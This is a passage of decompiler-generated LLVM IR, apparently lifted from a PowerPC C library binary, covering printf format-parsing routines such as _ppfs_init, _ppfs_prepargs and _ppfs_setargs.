  br i1 %v4_10003d84, label %dec_label_pc_10003d8c, label %dec_label_pc_10003da0

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_10003d74, %dec_label_pc_10003adc, %dec_label_pc_100038b0
  %stack_var_-184.2 = phi i32 [ %v0_100039e4, %dec_label_pc_100038b0 ], [ %stack_var_-184.1, %dec_label_pc_10003d74 ], [ %v0_100039e4, %dec_label_pc_10003adc ]
  %v3_10003d8c = load i8*, i8** %stack_var_-200, align 4
  %v4_10003d8c = ptrtoint i8* %v3_10003d8c to i32
  store i32 %v4_10003d8c, i32* @r29, align 4
  br label %dec_label_pc_10003d90

dec_label_pc_10003d90:                            ; preds = %dec_label_pc_100037a4, %dec_label_pc_10003d8c
  %v0_10003d90 = phi i32 [ %v0_10003d90.pre, %dec_label_pc_100037a4 ], [ %v4_10003d8c, %dec_label_pc_10003d8c ]
  %v0_100039e4 = phi i32 [ %tmp56, %dec_label_pc_100037a4 ], [ %stack_var_-184.2, %dec_label_pc_10003d8c ]
  br label %dec_label_pc_100037bc

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003bf8, %dec_label_pc_10003d74, %dec_label_pc_10003d04, %dec_label_pc_10003cb0, %dec_label_pc_10003c94, %dec_label_pc_10003b54, %dec_label_pc_10003b24, %dec_label_pc_10003ab8, %dec_label_pc_100037f8, %dec_label_pc_10003d48
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10003da4

dec_label_pc_10003da4:                            ; preds = %dec_label_pc_10003804, %dec_label_pc_1000377c, %dec_label_pc_10003794, %dec_label_pc_10003da0
  store i32 %v0_10003750, i32* %r0.global-to-local, align 4
  %v0_10003da8 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10003da8

; uselistorder directives
  uselistorder i32 %v0_100039e4, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10003d6c, { 1, 2, 0 }
  uselistorder i32 %v1_10003c80, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10003c10, { 1, 0 }
  uselistorder i32 %v2_10003ba0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10003b00, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100039e4, { 1, 0 }
  uselistorder i32 %v6_1000399c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_1000396c, { 1, 0 }
  uselistorder i32 %v1_10003910, { 1, 0 }
  uselistorder i1 %v2_10003904, { 1, 0 }
  uselistorder i32 %v0_100038b4, { 1, 0, 2 }
  uselistorder i32 %v1_100038a0, { 1, 0 }
  uselistorder i32 %v0_10003898, { 1, 0 }
  uselistorder i32 %v1_10003894, { 1, 0 }
  uselistorder i32 %v1_10003810, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100037d8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_100037e8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10003c04, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1000384c, { 1, 2, 0 }
  uselistorder i32 %v4_10003844, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 1, 0, 2, 3, 6, 5, 7, 4, 10, 9, 8, 11, 12 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10003da4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10003da0, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10003d90, { 1, 0 }
  uselistorder label %dec_label_pc_10003d74, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003d48, { 1, 0 }
  uselistorder label %dec_label_pc_10003d24, { 1, 0 }
  uselistorder label %dec_label_pc_10003cb0, { 1, 0 }
  uselistorder label %dec_label_pc_10003c88, { 1, 0 }
  uselistorder label %dec_label_pc_10003c70, { 1, 0 }
  uselistorder label %dec_label_pc_10003c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10003c3c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003c3cthread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10003c30, { 1, 0 }
  uselistorder label %dec_label_pc_10003bc0, { 1, 0 }
  uselistorder label %dec_label_pc_10003bac, { 1, 0 }
  uselistorder label %dec_label_pc_10003b24, { 1, 0 }
  uselistorder label %dec_label_pc_10003a74, { 1, 0 }
  uselistorder label %dec_label_pc_10003a5c, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10003a0c, { 1, 0 }
  uselistorder label %dec_label_pc_100039f0, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000397c, { 1, 0 }
  uselistorder label %dec_label_pc_10003960, { 1, 0 }
  uselistorder label %dec_label_pc_1000394c, { 1, 0 }
  uselistorder label %dec_label_pc_10003948, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000391c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100038a4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10003868, { 1, 0 }
  uselistorder label %dec_label_pc_10003804, { 1, 0 }
  uselistorder label %dec_label_pc_100037f8, { 1, 0 }
  uselistorder label %dec_label_pc_100037bc, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10003dc0 = load i32, i32* @lr, align 4
  store i32 %v0_10003dc0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10003dd0 = load i32, i32* @r4, align 4
  store i32 %v0_10003dd0, i32* @r30, align 4
  store i32 268451296, i32* @lr, align 4
  %v3_10003ddc = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_10003de0 = load i32, i32* @r31, align 4
  %v1_10003de0 = add i32 %v0_10003de0, 24
  %v2_10003de0 = inttoptr i32 %v1_10003de0 to i32*
  %v3_10003de0 = load i32, i32* %v2_10003de0, align 4
  store i32 %v3_10003de0, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_10003de8 = load i32, i32* @r30, align 4
  %v2_10003de8 = inttoptr i32 %v0_10003de0 to i32*
  store i32 %v0_10003de8, i32* %v2_10003de8, align 4
  %v0_10003dec = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10003dec, i32* %ctr.global-to-local, align 4
  %v0_10003df0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003df0 = add i32 %v0_10003df0, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10003df8 = load i32, i32* @r31, align 4
  %v2_10003df8 = add i32 %v1_10003df8, 24
  %v3_10003df8 = inttoptr i32 %v2_10003df8 to i32*
  store i32 %v1_10003df0, i32* %v3_10003df8, align 4
  %v0_10003dfc = load i32, i32* @r31, align 4
  %v1_10003dfc = add i32 %v0_10003dfc, 40
  store i32 %v1_10003dfc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10003e00

dec_label_pc_10003e00:                            ; preds = %dec_label_pc_10003e00, %entry
  %v1_10003e00 = phi i32 [ %v1_10003e04, %dec_label_pc_10003e00 ], [ %v1_10003dfc, %entry ]
  %v0_10003e00 = load i32, i32* %r0.global-to-local, align 4
  %v2_10003e00 = inttoptr i32 %v1_10003e00 to i32*
  store i32 %v0_10003e00, i32* %v2_10003e00, align 4
  %v0_10003e04 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003e04 = add i32 %v0_10003e04, 4
  store i32 %v1_10003e04, i32* %r9.global-to-local, align 4
  %v0_10003e08 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10003e08 = add i32 %v0_10003e08, -1
  store i32 %v1_10003e08, i32* %ctr.global-to-local, align 4
  %v2_10003e08 = icmp eq i32 %v1_10003e08, 0
  br i1 %v2_10003e08, label %dec_label_pc_10003e0c, label %dec_label_pc_10003e00

dec_label_pc_10003e0c:                            ; preds = %dec_label_pc_10003e00
  %v0_10003e0c = load i32, i32* @r30, align 4
  br label %dec_label_pc_10003e4c

dec_label_pc_10003e1c:                            ; preds = %dec_label_pc_10003e4c
  %v3_10003e54 = icmp eq i8 %v2_10003e4c, 37
  br i1 %v3_10003e54, label %dec_label_pc_10003e20, label %dec_label_pc_10003e48

dec_label_pc_10003e20:                            ; preds = %dec_label_pc_10003e1c
  %v1_10003e20 = add i32 %v0_10003e20, 1
  %v2_10003e20 = inttoptr i32 %v1_10003e20 to i8*
  %v3_10003e20 = load i8, i8* %v2_10003e20, align 1
  %v4_10003e20 = zext i8 %v3_10003e20 to i32
  store i32 %v4_10003e20, i32* %r0.global-to-local, align 4
  store i32 %v1_10003e20, i32* %r9.global-to-local, align 4
  %v3_10003e28 = icmp eq i8 %v3_10003e20, 37
  br i1 %v3_10003e28, label %dec_label_pc_10003e48, label %dec_label_pc_10003e30

dec_label_pc_10003e30:                            ; preds = %dec_label_pc_10003e20
  %v0_10003e24 = load i32, i32* @r31, align 4
  %v2_10003e30 = inttoptr i32 %v0_10003e24 to i32*
  store i32 %v1_10003e20, i32* %v2_10003e30, align 4
  store i32 268451384, i32* @lr, align 4
  %v1_10003e34 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003e34 = call i32 @_ppfs_parsespec(i32* %v2_10003e30, i32 %v1_10003e34)
  %v1_10003e38 = icmp slt i32 %v3_10003e34, 0
  br i1 %v1_10003e38, label %dec_label_pc_10003e64, label %dec_label_pc_10003e40

dec_label_pc_10003e40:                            ; preds = %dec_label_pc_10003e30
  %v0_10003e40 = load i32, i32* @r31, align 4
  %v1_10003e40 = inttoptr i32 %v0_10003e40 to i32*
  %v2_10003e40 = load i32, i32* %v1_10003e40, align 4
  br label %dec_label_pc_10003e4c

dec_label_pc_10003e48:                            ; preds = %dec_label_pc_10003e1c, %dec_label_pc_10003e20
  %v0_10003e48 = phi i32 [ %v0_10003e20, %dec_label_pc_10003e1c ], [ %v1_10003e20, %dec_label_pc_10003e20 ]
  %v1_10003e48 = add i32 %v0_10003e48, 1
  br label %dec_label_pc_10003e4c

dec_label_pc_10003e4c:                            ; preds = %dec_label_pc_10003e40, %dec_label_pc_10003e48, %dec_label_pc_10003e0c
  %v0_10003e20 = phi i32 [ %v0_10003e0c, %dec_label_pc_10003e0c ], [ %v1_10003e48, %dec_label_pc_10003e48 ], [ %v2_10003e40, %dec_label_pc_10003e40 ]
  store i32 %v0_10003e20, i32* %r9.global-to-local, align 4
  %v1_10003e4c = inttoptr i32 %v0_10003e20 to i8*
  %v2_10003e4c = load i8, i8* %v1_10003e4c, align 1
  %v3_10003e4c = zext i8 %v2_10003e4c to i32
  store i32 %v3_10003e4c, i32* %r0.global-to-local, align 4
  %v3_10003e50 = icmp eq i8 %v2_10003e4c, 0
  br i1 %v3_10003e50, label %dec_label_pc_10003e5c, label %dec_label_pc_10003e1c

dec_label_pc_10003e5c:                            ; preds = %dec_label_pc_10003e4c
  %v0_10003e5c = load i32, i32* @r30, align 4
  %v1_10003e5c = load i32, i32* @r31, align 4
  %v2_10003e5c = inttoptr i32 %v1_10003e5c to i32*
  store i32 %v0_10003e5c, i32* %v2_10003e5c, align 4
  br label %dec_label_pc_10003e64

dec_label_pc_10003e64:                            ; preds = %dec_label_pc_10003e30, %dec_label_pc_10003e5c
  %storemerge = phi i32 [ 0, %dec_label_pc_10003e5c ], [ -1, %dec_label_pc_10003e30 ]
  store i32 %v0_10003dc0, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10003e4c, { 1, 2, 0 }
  uselistorder i32 %v0_10003e20, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10003e08, { 1, 0 }
  uselistorder i32 %v1_10003e04, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10003e64, { 1, 0 }
  uselistorder label %dec_label_pc_10003e4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003e48, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10003e78 = load i32, i32* @lr, align 4
  %v0_10003e80 = load i32, i32* @r3, align 4
  store i32 %v0_10003e80, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10003e9c = add i32 %v0_10003e80, 24
  %v2_10003e9c = inttoptr i32 %v1_10003e9c to i32*
  %v3_10003e9c = load i32, i32* %v2_10003e9c, align 4
  store i32 %v3_10003e9c, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_10003e9c, 1
  br i1 %tmp4, label %dec_label_pc_10003ec0, label %dec_label_pc_10003ea8

dec_label_pc_10003ea8:                            ; preds = %entry
  %v2_10003ea8 = add i32 %v0_10003e80, 8
  %v3_10003ea8 = inttoptr i32 %v2_10003ea8 to i32*
  store i32 0, i32* %v3_10003ea8, align 4
  %v0_10003eac = load i32, i32* @r30, align 4
  %v1_10003eac = load i32, i32* @r3, align 4
  %v2_10003eac = add i32 %v1_10003eac, 28
  %v3_10003eac = inttoptr i32 %v2_10003eac to i32*
  store i32 %v0_10003eac, i32* %v3_10003eac, align 4
  %v0_10003eb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003eb0 = load i32, i32* @r3, align 4
  %v2_10003eb0 = add i32 %v1_10003eb0, 24
  %v3_10003eb0 = inttoptr i32 %v2_10003eb0 to i32*
  store i32 %v0_10003eb0, i32* %v3_10003eb0, align 4
  %v0_10003eb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003eb4 = load i32, i32* @r3, align 4
  %v2_10003eb4 = add i32 %v1_10003eb4, 4
  %v3_10003eb4 = inttoptr i32 %v2_10003eb4 to i32*
  store i32 %v0_10003eb4, i32* %v3_10003eb4, align 4
  store i32 268451516, i32* @lr, align 4
  %v0_10003eb8 = call i32 @_ppfs_setargs()
  store i32 %v0_10003eb8, i32* %r3.global-to-local, align 4
  %v0_10003ebc = load i32, i32* @r30, align 4
  %v1_10003ebc = load i32, i32* @r31, align 4
  %v2_10003ebc = add i32 %v1_10003ebc, 24
  %v3_10003ebc = inttoptr i32 %v2_10003ebc to i32*
  store i32 %v0_10003ebc, i32* %v3_10003ebc, align 4
  %v0_10003ed0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003ec0

dec_label_pc_10003ec0:                            ; preds = %entry, %dec_label_pc_10003ea8
  %v0_10003ed0 = phi i32 [ %v0_10003e80, %entry ], [ %v0_10003ed0.pre, %dec_label_pc_10003ea8 ]
  store i32 %v0_10003e78, i32* %r0.global-to-local, align 4
  ret i32 %v0_10003ed0

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_10003ec0, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10003ed4 = load i32, i32* @r3, align 4
  %v1_10003ed4 = add i32 %v0_10003ed4, 24
  %v2_10003ed4 = inttoptr i32 %v1_10003ed4 to i32*
  %v3_10003ed4 = load i32, i32* %v2_10003ed4, align 4
  store i32 %v3_10003ed4, i32* %r0.global-to-local, align 4
  %v1_10003ed8 = add i32 %v0_10003ed4, 88
  store i32 %v1_10003ed8, i32* %r8.global-to-local, align 4
  %v1_10003edc = add i32 %v0_10003ed4, 8
  %v2_10003edc = inttoptr i32 %v1_10003edc to i32*
  %v3_10003edc = load i32, i32* %v2_10003edc, align 4
  store i32 %v3_10003edc, i32* %r9.global-to-local, align 4
  %v2_10003ee0 = icmp sgt i32 %v3_10003ed4, 0
  %v3_10003ee0 = icmp eq i32 %v3_10003ed4, 0
  store i1 %v2_10003ee0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003ee0, label %dec_label_pc_10003ee8, label %dec_label_pc_100040d4

dec_label_pc_10003ee8:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10003eec = icmp ne i32 %v3_10003edc, -2147483648
  %v4_10003eec = icmp eq i32 %v3_10003edc, -2147483648
  store i1 %v3_10003eec, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10003eec, label %dec_label_pc_10003ef4, label %dec_label_pc_10003f34

dec_label_pc_10003ef4:                            ; preds = %dec_label_pc_10003ee8
  %v1_10003ef4 = add i32 %v0_10003ed4, 76
  %v2_10003ef4 = inttoptr i32 %v1_10003ef4 to i8*
  %v3_10003ef4 = load i8, i8* %v2_10003ef4, align 1
  %v4_10003ef4 = zext i8 %v3_10003ef4 to i32
  store i32 %v4_10003ef4, i32* %r10.global-to-local, align 4
  store i32 %v1_10003ef4, i32* %r11.global-to-local, align 4
  %v2_10003efc = icmp ugt i8 %v3_10003ef4, 8
  store i1 %v2_10003efc, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_10003ef4, 7
  br i1 %tmp, label %dec_label_pc_10003f1c, label %dec_label_pc_10003f04

dec_label_pc_10003f04:                            ; preds = %dec_label_pc_10003ef4
  %v1_10003f04 = add i32 %v0_10003ed4, 84
  %v2_10003f04 = inttoptr i32 %v1_10003f04 to i32*
  %v3_10003f04 = load i32, i32* %v2_10003f04, align 4
  %v1_10003f08 = mul nuw nsw i32 %v4_10003ef4, 4
  %v2_10003f0c = add i32 %v3_10003f04, %v1_10003f08
  store i32 %v2_10003f0c, i32* %r9.global-to-local, align 4
  %v1_10003f10 = add nuw nsw i32 %v4_10003ef4, 1
  store i32 %v1_10003f10, i32* %r0.global-to-local, align 4
  %v1_10003f14 = trunc i32 %v1_10003f10 to i8
  store i8 %v1_10003f14, i8* %v2_10003ef4, align 1
  br label %dec_label_pc_10003f28

dec_label_pc_10003f1c:                            ; preds = %dec_label_pc_10003ef4
  %v1_10003f1c = add i32 %v0_10003ed4, 80
  %v2_10003f1c = inttoptr i32 %v1_10003f1c to i32*
  %v3_10003f1c = load i32, i32* %v2_10003f1c, align 4
  store i32 %v3_10003f1c, i32* %r9.global-to-local, align 4
  %v1_10003f20 = add i32 %v3_10003f1c, 4
  store i32 %v1_10003f20, i32* %r0.global-to-local, align 4
  store i32 %v1_10003f20, i32* %v2_10003f1c, align 4
  br label %dec_label_pc_10003f28

dec_label_pc_10003f28:                            ; preds = %dec_label_pc_10003f04, %dec_label_pc_10003f1c
  %v0_10003f28 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003f28 = inttoptr i32 %v0_10003f28 to i32*
  %v2_10003f28 = load i32, i32* %v1_10003f28, align 4
  store i32 %v2_10003f28, i32* %r0.global-to-local, align 4
  %v1_10003f2c = load i32, i32* %r8.global-to-local, align 4
  %v2_10003f2c = inttoptr i32 %v1_10003f2c to i32*
  store i32 %v2_10003f28, i32* %v2_10003f2c, align 4
  %v0_10003f30 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003f30 = load i32, i32* @r3, align 4
  %v2_10003f30 = add i32 %v1_10003f30, 8
  %v3_10003f30 = inttoptr i32 %v2_10003f30 to i32*
  store i32 %v0_10003f30, i32* %v3_10003f30, align 4
  %v0_10003f34.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10003f34

dec_label_pc_10003f34:                            ; preds = %dec_label_pc_10003ee8, %dec_label_pc_10003f28
  %v2_10003f64 = phi i32 [ %v0_10003ed4, %dec_label_pc_10003ee8 ], [ %v0_10003f34.pre, %dec_label_pc_10003f28 ]
  %v1_10003f34 = add i32 %v2_10003f64, 4
  %v2_10003f34 = inttoptr i32 %v1_10003f34 to i32*
  %v3_10003f34 = load i32, i32* %v2_10003f34, align 4
  store i32 %v3_10003f34, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10003f3c = icmp ne i32 %v3_10003f34, -2147483648
  %v4_10003f3c = icmp eq i32 %v3_10003f34, -2147483648
  store i1 %v3_10003f3c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10003f3c, label %dec_label_pc_10003f44, label %dec_label_pc_100040c4.preheader

dec_label_pc_10003f44:                            ; preds = %dec_label_pc_10003f34
  %v1_10003f44 = add i32 %v2_10003f64, 76
  %v2_10003f44 = inttoptr i32 %v1_10003f44 to i8*
  %v3_10003f44 = load i8, i8* %v2_10003f44, align 1
  %v4_10003f44 = zext i8 %v3_10003f44 to i32
  store i32 %v4_10003f44, i32* %r10.global-to-local, align 4
  store i32 %v1_10003f44, i32* %r11.global-to-local, align 4
  %v2_10003f4c = icmp ugt i8 %v3_10003f44, 8
  store i1 %v2_10003f4c, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_10003f44, 7
  br i1 %tmp22, label %dec_label_pc_10003f6c, label %dec_label_pc_10003f54

dec_label_pc_10003f54:                            ; preds = %dec_label_pc_10003f44
  %v1_10003f54 = add i32 %v2_10003f64, 84
  %v2_10003f54 = inttoptr i32 %v1_10003f54 to i32*
  %v3_10003f54 = load i32, i32* %v2_10003f54, align 4
  %v1_10003f58 = mul nuw nsw i32 %v4_10003f44, 4
  %v2_10003f5c = add i32 %v3_10003f54, %v1_10003f58
  store i32 %v2_10003f5c, i32* %r9.global-to-local, align 4
  %v1_10003f60 = add nuw nsw i32 %v4_10003f44, 1
  store i32 %v1_10003f60, i32* %r0.global-to-local, align 4
  %v1_10003f64 = trunc i32 %v1_10003f60 to i8
  store i8 %v1_10003f64, i8* %v2_10003f44, align 1
  br label %dec_label_pc_10003f78

dec_label_pc_10003f6c:                            ; preds = %dec_label_pc_10003f44
  %v1_10003f6c = add i32 %v2_10003f64, 80
  %v2_10003f6c = inttoptr i32 %v1_10003f6c to i32*
  %v3_10003f6c = load i32, i32* %v2_10003f6c, align 4
  store i32 %v3_10003f6c, i32* %r9.global-to-local, align 4
  %v1_10003f70 = add i32 %v3_10003f6c, 4
  store i32 %v1_10003f70, i32* %r0.global-to-local, align 4
  store i32 %v1_10003f70, i32* %v2_10003f6c, align 4
  br label %dec_label_pc_10003f78

dec_label_pc_10003f78:                            ; preds = %dec_label_pc_10003f54, %dec_label_pc_10003f6c
  %v0_10003f78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003f78 = inttoptr i32 %v0_10003f78 to i32*
  %v2_10003f78 = load i32, i32* %v1_10003f78, align 4
  store i32 %v2_10003f78, i32* %r0.global-to-local, align 4
  %v1_10003f7c = load i32, i32* %r8.global-to-local, align 4
  %v2_10003f7c = inttoptr i32 %v1_10003f7c to i32*
  store i32 %v2_10003f78, i32* %v2_10003f7c, align 4
  %v0_10003f80 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003f80 = load i32, i32* @r3, align 4
  %v2_10003f80 = add i32 %v1_10003f80, 4
  %v3_10003f80 = inttoptr i32 %v2_10003f80 to i32*
  store i32 %v0_10003f80, i32* %v3_10003f80, align 4
  %v0_100040c45.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100040c4.preheader

dec_label_pc_100040c4.preheader:                  ; preds = %dec_label_pc_10003f34, %dec_label_pc_10003f78
  %v0_100040c45 = phi i32 [ %v2_10003f64, %dec_label_pc_10003f34 ], [ %v0_100040c45.pre, %dec_label_pc_10003f78 ]
  store i32 0, i32* @r7, align 4
  %v1_100040c46 = add i32 %v0_100040c45, 28
  %v2_100040c47 = inttoptr i32 %v1_100040c46 to i32*
  %v3_100040c48 = load i32, i32* %v2_100040c47, align 4
  store i32 %v3_100040c48, i32* %r0.global-to-local, align 4
  %v2_100040c89 = icmp sgt i32 %v3_100040c48, 0
  %v3_100040c810 = icmp slt i32 %v3_100040c48, 0
  store i1 %v3_100040c810, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100040c89, label %dec_label_pc_10003f8c, label %dec_label_pc_10004114

dec_label_pc_10003f8c:                            ; preds = %dec_label_pc_100040c4.preheader, %dec_label_pc_100040c0
  %v2_100040a0 = phi i32 [ %v0_100040c4, %dec_label_pc_100040c0 ], [ %v0_100040c45, %dec_label_pc_100040c4.preheader ]
  %v0_10003f8c = phi i32 [ %v1_100040c0, %dec_label_pc_100040c0 ], [ 0, %dec_label_pc_100040c4.preheader ]
  %v1_10003f8c = mul i32 %v0_10003f8c, 4
  %v2_10003f90 = add i32 %v1_10003f8c, %v2_100040a0
  store i32 %v2_10003f90, i32* %r9.global-to-local, align 4
  %v1_10003f94 = add i32 %v2_10003f90, 40
  %v2_10003f94 = inttoptr i32 %v1_10003f94 to i32*
  %v3_10003f94 = load i32, i32* %v2_10003f94, align 4
  store i32 %v3_10003f94, i32* %r0.global-to-local, align 4
  %v2_10003f98 = icmp sgt i32 %v3_10003f94, 8
  %v3_10003f98 = icmp eq i32 %v3_10003f94, 8
  store i1 %v2_10003f98, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003f98, label %dec_label_pc_100040c0, label %dec_label_pc_10003fa0

dec_label_pc_10003fa0:                            ; preds = %dec_label_pc_10003f8c
  %v1_10003fa0 = add i32 %v2_100040a0, 76
  store i32 %v1_10003fa0, i32* %r10.global-to-local, align 4
  br i1 %v2_10003f98, label %dec_label_pc_10003fbc, label %dec_label_pc_10003fa8

dec_label_pc_10003fa8:                            ; preds = %dec_label_pc_10003fa0
  %v2_10003fa8 = icmp sgt i32 %v3_10003f94, 2
  store i1 %v2_10003fa8, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_10003f94, 3
  br i1 %tmp23, label %dec_label_pc_10004084, label %dec_label_pc_10003fd4

dec_label_pc_10003fbc:                            ; preds = %dec_label_pc_10003fa0
  %v2_10003fbc = icmp sgt i32 %v3_10003f94, 1024
  store i1 %v2_10003fbc, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_10003f94, 1025
  br i1 %tmp24, label %dec_label_pc_10004084, label %dec_label_pc_10003fc8

dec_label_pc_10003fc8:                            ; preds = %dec_label_pc_10003fbc
  %v2_10003fc8 = icmp sgt i32 %v3_10003f94, 2048
  %v3_10003fc8 = icmp eq i32 %v3_10003f94, 2048
  store i1 %v2_10003fc8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003fc8, label %dec_label_pc_10003fdc, label %dec_label_pc_10003fd0

dec_label_pc_10003fd0:                            ; preds = %dec_label_pc_10003fc8
  %v2_10003fd0 = icmp sgt i32 %v3_10003f94, 2055
  %v3_10003fd0 = icmp eq i32 %v3_10003f94, 2055
  store i1 %v2_10003fd0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003fd0, label %dec_label_pc_10004038, label %dec_label_pc_10004084

dec_label_pc_10003fd4:                            ; preds = %dec_label_pc_10003fa8
  %v3_10003fb4 = icmp eq i32 %v3_10003f94, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003fb4, label %dec_label_pc_10004038, label %dec_label_pc_10004084

dec_label_pc_10003fdc:                            ; preds = %dec_label_pc_10003fc8
  %v2_10003fdc = inttoptr i32 %v1_10003fa0 to i8*
  %v3_10003fdc = load i8, i8* %v2_10003fdc, align 1
  %v4_10003fdc = zext i8 %v3_10003fdc to i32
  %v2_10003fe0 = icmp ugt i8 %v3_10003fdc, 6
  store i1 %v2_10003fe0, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_10003fdc, 2
  %v1_10003fe4 = zext i8 %tmp28 to i32
  store i32 %v1_10003fe4, i32* %r9.global-to-local, align 4
  %v2_10003fe8 = add nuw nsw i32 %v1_10003fe4, %v4_10003fdc
  store i32 %v2_10003fe8, i32* %r0.global-to-local, align 4
